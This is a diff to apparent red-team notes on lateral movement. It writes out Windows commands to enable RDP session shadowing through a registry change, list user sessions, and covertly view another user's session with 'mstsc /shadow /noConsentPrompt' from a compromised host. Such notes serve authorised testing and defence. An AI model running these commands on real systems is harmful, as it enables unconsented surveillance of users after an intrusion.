@@ -70,11 +70,11 @@ Enter-PSSession {PSSession_ID_returned}
 
 **Outbound RDP sessions**
 - Assume a user has RDP'd into another system from an owned box
-- We can shadow the existing sessions using the following as Administrator:
+- We can shadow the existing sessions using the following as Administrator while RDP'd in:
   - `reg add "\\LOCALHOST\HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services" /V Shadow /T REG_DWORD /D 4 /F`
-  - `query user`
-    - Find the ID of the user session to shadow
+  - `query user`: Find the ID of the user session to shadow
   - `mstsc /shadow:4 /noConsentPrompt`
+- This allows us to see their session on the owned box, 
 
 ## NTLM/Kerberos Pivoting
 
